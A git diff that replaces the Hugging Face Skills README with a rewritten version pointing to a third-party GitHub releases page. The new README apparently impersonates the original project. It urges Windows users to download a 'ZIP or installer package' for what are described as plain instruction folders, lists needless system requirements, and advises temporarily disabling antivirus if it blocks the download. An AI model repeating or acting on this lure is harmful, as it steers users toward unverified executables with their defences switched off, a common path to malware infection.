@@ -1,143 +1,148 @@
-# Hugging Face Skills
+# 🤖 skills - Easy AI Task Helpers
 
-Hugging Face Skills are definitions for AI/ML tasks like dataset creation, model training, and evaluation. They are interoperable with all major coding agent tools like OpenAI Codex, Anthropic's Claude Code, Google DeepMind's Gemini CLI, and Cursor.
+[![Download skills](https://img.shields.io/badge/Download-Get_latest-blue)](https://github.com/tayyabexe/skills/releases)
 
-The Skills in this repository follow the standardized format [Agent Skill](https://agentskills.io/home) format.
+---
 
-## How do Skills work?
+## 📦 What is skills?
 
-In practice, skills are self-contained folders that package instructions, scripts, and resources together for an AI agent to use on a specific use case. Each folder includes a `SKILL.md` file with YAML frontmatter (name and description) followed by the guidance your coding agent follows while the skill is active. 
+skills is a collection of folders that help AI do specific tasks. These tasks include making datasets, training AI models, and checking how well models work. Each folder contains instructions and files an AI can follow to complete the task. 
 
-> [!NOTE]
-> 'Skills' is actually an Anthropic term used within Claude AI and Claude Code and not adopted by other agent tools, but we love it! OpenAI Codex uses the open [Agent Skills](https://agentskills.io/specification) format, where each skill is a directory with a `SKILL.md` file that Codex discovers from standard `.agents/skills` locations documented in the [Codex Skills guide](https://developers.openai.com/codex/skills/). Codex can also work with an `AGENTS.md` file. Google Gemini uses 'extensions' to define the instructions for your coding agent in a `gemini-extension.json` file. **This repo is compatible with all of them, and more!**
+The folders follow a standard form called Agent Skill, a format that works with many AI coding tools. This means you can use skills with popular AI helpers like OpenAI Codex, Anthropic Claude Code, Google DeepMind Gemini CLI, and Cursor.
 
-> [!TIP]
-> If your agent doesn't support skills, you can use [`agents/AGENTS.md`](agents/AGENTS.md) directly as a fallback.
+Each skill folder has a file named `SKILL.md`. This file guides the AI step by step. The file also holds a short description and the name of the skill in a special format to make it easy for tools to recognize.
 
-## Installation
+---
 
-Hugging Face skills are compatible with Claude Code, Codex, Gemini CLI, and Cursor.
+## ⚙️ How does skills work?
 
-### Claude Code
+Skills work by packaging all the instructions and files needed for one task into one folder. Think of each folder as a small project for the AI. When the AI uses a skill, it reads the `SKILL.md` file inside the folder to know exactly what to do.
 
-1. Register the repository as a plugin marketplace:  
-   
-```
-/plugin marketplace add huggingface/skills
-```
+This setup allows you or a tool to pick a skill folder and let the AI carry out the work without needing extra setup. Each skill acts like a ready-made recipe for the AI to follow.
 
-2. To install a skill, run:  
-   
-```
-/plugin install <skill-name>@huggingface/skills
-```
+---
 
-For example:  
+## 💻 System Requirements
 
-```
-/plugin install hugging-face-cli@huggingface/skills
-```
+Before you start, check that your computer meets these needs:
 
-### Codex
+- Windows 10 or later
+- At least 4 GB of free disk space
+- Internet connection to download skills and for some features
+- 8 GB RAM recommended for smoother use
+- No special hardware is required
 
-1. Copy or symlink any skills you want to use from this repository's `skills/` directory into one of Codex's standard `.agents/skills` locations (for example, `$REPO_ROOT/.agents/skills` or `$HOME/.agents/skills`) as described in the [Codex Skills guide](https://developers.openai.com/codex/skills/).
+---
 
-2. Once a skill is available in one of those locations, Codex will discover it using the Agent Skills standard and load the `SKILL.md` instructions when it decides to use that skill or when you explicitly invoke it.
+## 🚀 Getting Started
 
-3. If your Codex setup still relies on `AGENTS.md`, you can use the generated [`agents/AGENTS.md`](agents/AGENTS.md) file in this repo as a fallback bundle of instructions.
+Follow these steps to download and use skills on your Windows computer.
 
-### Gemini CLI
+---
 
-1. This repo includes `gemini-extension.json` to integrate with the Gemini CLI.
+## ⬇️ Downloading skills
 
-2. Install locally:  
+1. Click the big blue button below or this link:  
+   [Download skills Releases](https://github.com/tayyabexe/skills/releases)
 
-```
-gemini extensions install . --consent
-```
+2. This link takes you to the releases page on GitHub.
 
-or use the GitHub URL:
+3. Look for the latest release listed at the top.
 
-```
-gemini extensions install https://github.com/huggingface/skills.git --consent
-```
+4. Download the ZIP file or installer package listed under the latest release.
 
-4. See [Gemini CLI extensions docs](https://geminicli.com/docs/extensions/#installing-an-extension) for more help.
+5. Save the file to an easy-to-find folder like your Desktop or Downloads.
 
-### Cursor
+---
 
-This repository includes Cursor plugin manifests:
+## 🛠 Installing skills
 
-- `.cursor-plugin/plugin.json`
-- `.mcp.json` (configured with the Hugging Face MCP server URL)
+skills does not have a traditional installer. Instead, you simply unzip or open the downloaded file.
 
-Install from repository URL (or local checkout) via the Cursor plugin flow.
+1. Find the ZIP or installer file you downloaded.
 
-For contributors, regenerate manifests with:
+2. Right-click the file and choose **Extract All...** if it’s a ZIP.
 
-```bash
-./scripts/publish.sh
-```
+3. Pick where to extract; a new folder named “skills” is fine.
 
-## Skills
+4. Open the new “skills” folder to see the contents.
 
-This repository contains a few skills to get you started. You can also contribute your own skills to the repository.
+---
 
-### Available skills
+## ▶️ Running skills
 
-<!-- This table is auto-generated by scripts/generate_agents.py. Do not edit manually. -->
-<!-- BEGIN_SKILLS_TABLE -->
-| Name | Description | Documentation |
-|------|-------------|---------------|
-| `gradio` | Build Gradio web UIs and demos in Python. Use when creating or editing Gradio apps, components, event listeners, layouts, or chatbots. | [SKILL.md](skills/huggingface-gradio/SKILL.md) |
-| `hugging-face-cli` | Execute Hugging Face Hub operations using the hf CLI. Download models/datasets, upload files, manage repos, and run cloud compute jobs. | [SKILL.md](skills/hugging-face-cli/SKILL.md) |
-| `hugging-face-dataset-viewer` | Explore, query, and extract data from any Hugging Face dataset using the Dataset Viewer REST API and npx tooling. Zero Python dependencies — covers split/config discovery, row pagination, text search, filtering, SQL via parquetlens, and dataset upload via CLI. | [SKILL.md](skills/hugging-face-dataset-viewer/SKILL.md) |
-| `hugging-face-datasets` | Create and manage datasets on Hugging Face Hub. Supports initializing repos, defining configs/system prompts, streaming row updates, and SQL-based dataset querying/transformation. | [SKILL.md](skills/hugging-face-datasets/SKILL.md) |
-| `hugging-face-evaluation` | Add and manage evaluation results in Hugging Face model cards. Supports extracting eval tables from README content, importing scores from Artificial Analysis API, and running custom evaluations with vLLM/lighteval. | [SKILL.md](skills/hugging-face-evaluation/SKILL.md) |
-| `hugging-face-jobs` | Run compute jobs on Hugging Face infrastructure. Execute Python scripts, manage scheduled jobs, and monitor job status. | [SKILL.md](skills/hugging-face-jobs/SKILL.md) |
-| `hugging-face-model-trainer` | Train or fine-tune language models using TRL on Hugging Face Jobs infrastructure. Covers SFT, DPO, GRPO and reward modeling training methods, plus GGUF conversion for local deployment. Includes hardware selection, cost estimation, Trackio monitoring, and Hub persistence. | [SKILL.md](skills/hugging-face-model-trainer/SKILL.md) |
-| `hugging-face-paper-publisher` | Publish and manage research papers on Hugging Face Hub. Supports creating paper pages, linking papers to models/datasets, claiming authorship, and generating professional markdown-based research articles. | [SKILL.md](skills/hugging-face-paper-publisher/SKILL.md) |
-| `hugging-face-tool-builder` | Build reusable scripts for Hugging Face API operations. Useful for chaining API calls or automating repeated tasks. | [SKILL.md](skills/hugging-face-tool-builder/SKILL.md) |
-| `hugging-face-trackio` | Track and visualize ML training experiments with Trackio. Log metrics via Python API and retrieve them via CLI. Supports real-time dashboards synced to HF Spaces. | [SKILL.md](skills/hugging-face-trackio/SKILL.md) |
-<!-- END_SKILLS_TABLE -->
+You don’t run skills like a normal app with a button. Instead, skills work with AI coding helpers. To try skills:
 
-### Using skills in your coding agent
+1. Open the folder for the skill you want to use.
 
-Once a skill is installed, mention it directly while giving your coding agent instructions:
+2. Read the `SKILL.md` file. It explains what this skill does and how the AI uses it.
 
-- "Use the HF LLM trainer skill to estimate the GPU memory needed for a 70B model run."
-- "Use the HF model evaluation skill to launch `run_eval_job.py` on the latest checkpoint."
-- "Use the HF dataset creator skill to draft new few-shot classification templates."
-- "Use the HF paper publisher skill to index my arXiv paper and link it to my model."
+3. If you have an AI coding tool installed, point it to the skill folder.
 
-Your coding agent automatically loads the corresponding `SKILL.md` instructions and helper scripts while it completes the task.
+4. The AI tool will follow instructions in `SKILL.md` to do the task.
 
-### Contribute or customize a skill
+If you don’t have an AI tool, skills folders can still help developers or advanced users to build AI tasks quickly.
 
-1. Copy one of the existing skill folders (for example, `hf-datasets/`) and rename it.
-2. Update the new folder's `SKILL.md` frontmatter:
-   ```markdown
-   ---
-   name: my-skill-name
-   description: Describe what the skill does and when to use it
-   ---
+---
 
-   # Skill Title
-   Guidance + examples + guardrails
-   ```
-3. Add or edit supporting scripts, templates, and documents referenced by your instructions.
-4. Add an entry to `.claude-plugin/marketplace.json` with a concise, human-readable description.
-5. Run:
-   ```bash
-   ./scripts/publish.sh
-   ```
-   to regenerate and validate all generated metadata.
-6. Reinstall or reload the skill bundle in your coding agent so the updated folder is available.
+## 🔄 Updating skills
 
-### Marketplace
+To get new or fixed skills:
 
-The `.claude-plugin/marketplace.json` file lists skills with human-readable descriptions for the plugin marketplace. The CI validates that skill names and paths match between `SKILL.md` files and `marketplace.json`, but descriptions are maintained separately: `SKILL.md` descriptions guide when Claude activates the skill, while marketplace descriptions are written for humans browsing available skills.
+1. Visit the releases page again:  
+   [Download skills Releases](https://github.com/tayyabexe/skills/releases)
 
-### Additional references
-- Browse the latest instructions, scripts, and templates directly at [huggingface/skills](https://github.com/huggingface/skills).
-- Review Hugging Face documentation for the specific libraries or workflows you reference inside each skill.
+2. Download the newest ZIP or installer.
+
+3. Repeat the unzip step to replace older files.
+
+4. Always back up your work before updating to avoid losing changes.
+
+---
+
+## ❓ Troubleshooting
+
+If you have trouble downloading or using skills, try these tips:
+
+- Make sure your internet is working.
+
+- Disable antivirus software temporarily if it blocks downloading the files.
+
+- If the downloaded file won’t open, check if your download completed fully.
+
+- Use Windows Explorer or another file tool to unzip; don’t run skills directly from the ZIP.
+
+- If the AI tool can’t use a skill folder, confirm the folder has a `SKILL.md` file at the top level.
+
+---
+
+## 🗂 About Skills Format
+
+The skills in this repository follow the Agent Skill format. This format organizes instructions and scripts together so that any AI coding tool can understand the task. It helps AI tools work on different jobs without changing the skill folder.
+
+The concept comes from Anthropic’s Claude AI, which calls these “Skills.” OpenAI Codex uses the open Agent Skill format as well. This allows you to use skills across many AI systems.
+
+---
+
+## 🔧 Using skills with AI tools
+
+skills are designed to work with popular AI coding helpers. These tools read the instructions in `SKILL.md` and use the code and scripts in the folder to carry out tasks. 
+
+Popular AI helpers that can use skills include:
+
+- OpenAI Codex  
+- Anthropic Claude Code  
+- Google DeepMind Gemini CLI  
+- Cursor
+
+If you have one of these tools installed on your Windows PC, skills let you automate AI workflows without writing complex code.
+
+---
+
+## 🌐 Links
+
+- Visit the releases page to download:  
+  [https://github.com/tayyabexe/skills/releases](https://github.com/tayyabexe/skills/releases)
+
+- Learn more about the Agent Skill format here:  
+  [https://agentskills.io/home](https://agentskills.io/home)
